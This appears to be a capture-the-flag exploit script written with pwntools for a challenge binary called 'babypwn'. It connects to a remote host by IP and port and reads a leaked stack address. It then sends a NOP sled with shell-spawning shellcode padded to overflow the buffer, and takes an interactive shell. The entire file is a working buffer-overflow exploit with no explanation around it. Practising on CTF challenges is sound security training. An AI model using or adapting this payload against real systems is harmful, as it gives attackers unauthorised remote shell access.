from pwn import *

elf = context.binary = ELF("./babypwn", checksec=False)
context.log_level='debug'
p=remote("52.59.124.14", 10020)

p.recvuntil(b": ")
leak = int((p.recvline()).decode(),16)
print(leak)

p.recv()

shellcode=asm(shellcraft.popad())
shellcode+=asm(shellcraft.sh())
padding=asm('nop')*(520-len(shellcode))

payload = flat([
	padding,
	shellcode,
	leak
])

p.sendline(payload)
p.interactive()
